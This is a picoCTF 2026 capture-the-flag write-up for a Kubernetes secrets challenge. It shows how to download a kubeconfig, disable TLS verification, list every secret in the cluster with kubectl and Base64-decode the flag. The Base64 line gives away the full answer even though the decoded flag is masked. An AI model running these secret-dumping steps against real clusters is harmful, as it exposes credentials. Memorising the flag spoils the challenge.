# KSECRETS — picoCTF 2026

Hints:
- Hint 1: Secrets in Kubernetes are usually stored in **Kubernetes Secrets**
- Hint 2: Kubernetes stores secret values as **Base64‑encoded strings**
- Hint 3: Ignore TLS issues (use `insecure-skip-tls-verify: true`)

Download the kubeconfig:

    wget http://green-hill.picoctf.net:53694/kubeconfig

Make a backup:

    cp kubeconfig kubekonfig_orig

Edit it to bypass TLS:

    nano kubeconfig

Diff shows the needed changes:

    diff kubeconfig_orig kubeconfig
      server: https://green-hill.picoctf.net:53694
      insecure-skip-tls-verify: true

List namespaces:

    kubectl --kubeconfig kubeconfig get namespaces

List secrets across all namespaces:

    kubectl --kubeconfig kubeconfig get secrets -A
    NAMESPACE     NAME                       TYPE                               DATA   AGE
    kube-system   chart-values-traefik       helmcharts.helm.cattle.io/values   1      5m56s
    kube-system   chart-values-traefik-crd   helmcharts.helm.cattle.io/values   0      5m56s
    kube-system   k3s-serving                kubernetes.io/tls                  2      5m58s
    picoctf       ctf-secret                 Opaque                             1      5m48s

Retrieve the secret:

    kubectl --kubeconfig kubeconfig -n picoctf get secret ctf-secret -o yaml

Extract the flag field:

    kubectl --kubeconfig kubeconfig -n picoctf get secret ctf-secret -o yaml | grep "flag:"
      flag: cGljb0NURntrczNjcjM3NV80MW43X3M0ZjNfMDE4YzRkOWJ9Cg==

Decode the Base64:

    echo "cGljb0NURntrczNjcjM3NV80MW43X3M0ZjNfMDE4YzRkOWJ9Cg==" | base64 -d
    picoCTF{ks3cr375_41n7_s4f3_********}
